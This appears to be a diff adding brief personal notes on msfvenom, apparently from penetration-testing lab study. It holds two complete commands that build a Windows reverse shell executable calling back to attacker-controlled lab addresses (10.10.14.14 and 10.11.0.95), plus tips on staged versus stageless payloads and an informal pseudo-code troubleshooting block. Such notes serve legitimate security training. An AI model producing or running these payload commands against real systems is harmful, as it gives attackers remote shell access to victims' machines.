@@ -1,0 +1,19 @@
+#Format
+msfvenom -p <payload> -f <ext> LHOST=<ip> LPORT=<port>
+
+#Always check payload type!!
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o shell.exe
+
+#ALWAYS USE STAGELESS PAYLOADS FOR NC REVERSE SHELL
+
+if !(shell_return){
+	arch problem;
+elseif (shell_died_instantly)){
+	payload problem;
+	}	
+}
+
+#Staged payload = split into 2 areas, 1st to initiate connection, rest to send actual payload ==> reverse_tcp
+#Stageless payload = all in one, suitable for nc listeners bcx it is stable ==> shell_reverse_tcp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.95 LPORT=80 -f exe -o shell.exe
